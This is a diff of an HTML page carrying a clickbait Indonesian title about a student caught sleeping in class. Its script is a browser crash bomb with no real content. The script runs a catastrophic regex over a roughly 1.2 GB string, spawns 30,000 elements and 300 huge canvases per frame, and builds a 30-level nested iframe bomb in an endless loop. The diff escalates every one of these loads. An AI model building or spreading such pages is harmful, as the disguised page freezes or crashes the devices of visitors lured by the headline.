@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Seorang siswa tertangkap basah Tidur di kelas saat jam pelajaran berlangsung</title>
+  <title>Seorang siswa tertangkap basah Tidur di kelas saat jam pelajaran berlangsung siswa melakukan hal yang tak terduga sampai...</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body {
       width: 100%; height: 100%;
       background: black;
-      color: lime;
+      color: red;
       font-family: monospace;
       overflow: hidden;
     }
@@ -15,25 +15,20 @@
   </style>
 </head>
 <body>
-  <h1>System overload 20X</h1>
+  <h1>⚠️ SYSTEM BURN TEST 30X ⚠️</h1>
   <script>
-    // Karakter Unicode berat (Jawa, Hieroglif, Sumeria, dll)
     const u = "ꦲꦴꦿꦺ𓂀𓊃𒈾𒀭𒉿𐏓𐎚𐎷𑀓𑀺𑀽𑁇𑁒";
+    const bigStr = u.repeat(600_000_000); // ≈ 1.2 GB in memory
 
-    // String sangat besar untuk regex test
-    const bigStr = u.repeat(20_000_000); // 20 juta karakter
-
-    // Regex berat: Unicode blok & nested group
     const pattern = /([\u1b80-\u1bbf\u13000-\u1342f\ud800-\udfff]+)+$/;
 
     (function loop() {
-      // Regex CPU spike
       try { pattern.test(bigStr); } catch (e) {}
 
-      // DOM spam berat: 1000 elemen per frame
-      for (let i = 0; i < 1000; i++) {
+      // DOM spam 30,000 elemen per frame
+      for (let i = 0; i < 30_000; i++) {
         const d = document.createElement("div");
-        d.innerText = u.repeat(3000); // 3000× karakter unik
+        d.innerText = u.repeat(3000);
         d.style.fontSize = `${6 + Math.random() * 40}px`;
         d.style.color = `hsl(${Math.random() * 360}, 100%, 70%)`;
         d.style.left = `${Math.random() * window.innerWidth}px`;
@@ -41,10 +36,10 @@
         document.body.appendChild(d);
       }
 
-      // Canvas overload ekstrem: 10 canvas ukuran 20000x20000
-      for (let j = 0; j < 10; j++) {
+      // 300 canvas 20k×20k
+      for (let j = 0; j < 300; j++) {
         const c = document.createElement("canvas");
-        c.width = c.height = 20000; // 20000x20000 ≈ 1.6 GB/canvas
+        c.width = c.height = 20000;
         const ctx = c.getContext("2d");
         for (let i = 0; i < 1000; i++) {
           ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
@@ -53,14 +48,17 @@
         document.body.appendChild(c);
       }
 
-      // Recursive iframe bomb
+      // Iframe bomb 30 tingkat
+      let nested = "<h1>" + u.repeat(1000) + "</h1>";
+      for (let i = 0; i < 30; i++) {
+        nested = `<iframe srcdoc='${nested.replace(/'/g, "\\'")}'></iframe>`;
+      }
       const iframe = document.createElement("iframe");
-      iframe.srcdoc = `<iframe srcdoc="<iframe srcdoc='<iframe srcdoc=\\"<h1>${u.repeat(1000)}</h1>\\"></iframe>'></iframe>"></iframe>`;
+      iframe.srcdoc = nested;
       iframe.width = iframe.height = 2;
       iframe.style.border = "none";
       document.body.appendChild(iframe);
 
-      // Loop ulang tanpa jeda
       requestAnimationFrame(loop);
     })();
   </script>
